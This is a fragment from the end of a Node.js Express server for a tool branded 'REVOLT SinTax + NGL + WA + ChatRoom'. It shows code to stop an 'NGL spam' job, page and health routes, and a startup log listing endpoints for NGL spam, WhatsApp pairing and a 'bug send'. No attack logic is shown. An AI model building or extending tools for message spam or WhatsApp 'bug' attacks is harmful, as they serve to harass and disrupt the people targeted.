  document.getElementById('nglStartBtn').disabled = false;
  document.getElementById('nglStartBtn').style.display = 'flex';
  document.getElementById('nglStopBtn').style.display = 'none';
}

async function stopNglSpam(){
  await fetch('/api/ngl/stop',{method:'POST'}).catch(()=>{});
  if (nglPollTimer){ clearInterval(nglPollTimer); nglPollTimer = null; }
  nglLogUI('stopped by user', 'warn');
  nglPopupLog('[warn] stopped by user', 'warn');
  resetNglButtons();
}

updateSenderUI();
selectNglCount(document.querySelector('.ngl-count-btn.active'));
</script>
</body>
</html>`;

app.get('/', (req, res) => {
  const out = HTML.replace('__CHAT_URL__', CHAT_URL);
  res.type('html').send(out);
});
app.get('/health', (req, res) => res.json({ ok: true, port: PORT, chatUrl: CHAT_URL }));

// ═══════════════════════════════════════════════════════
//  START
// ═══════════════════════════════════════════════════════
app.listen(PORT, '0.0.0.0', () => {
  console.log('╔══════════════════════════════════════╗');
  console.log('║  REVOLT SinTax + NGL + WA + ChatRoom  ║');
  console.log('╚══════════════════════════════════════╝');
  console.log('✓ Server     → http://127.0.0.1:' + PORT);
  console.log('✓ NGL start  → POST /api/ngl/start');
  console.log('✓ NGL status → GET  /api/ngl/status');
  console.log('✓ WA pair    → POST /api/wa/pair');
  console.log('✓ Bug send   → POST /api/bug/send');
  console.log('✓ Chat room  → ' + CHAT_URL);
});
